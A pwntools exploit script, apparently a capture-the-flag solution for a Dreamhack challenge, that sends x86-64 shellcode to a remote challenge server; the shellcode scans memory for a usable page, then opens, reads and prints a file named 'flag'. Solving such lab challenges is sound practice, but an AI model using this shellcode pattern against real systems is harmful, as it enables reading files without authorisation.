from pwn import *

context.arch = 'amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 15962
r = remote(HOST, PORT)

sh = asm('''
    mov rbx, 0x1000
scan:
    mov rax, 1
    mov rdi, 1
    mov rsi, rbx
    mov rdx, 1
    syscall

    cmp rax, 1
    je found
    add rbx, 0x1000
    jp scan

found:
    mov dword ptr [rbx], 0x67616c66
    mov rdi, rbx
    mov rax, 2
    xor rsi, rsi
    xor rdx, rdx
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov rdx, 0x100
    mov rax, 0
    syscall

    mov rax, 1
    mov rsi, rsp
    mov rdi, 1
    mov rdx, 0x100
    syscall
''')
r.send(sh)

r.interactive()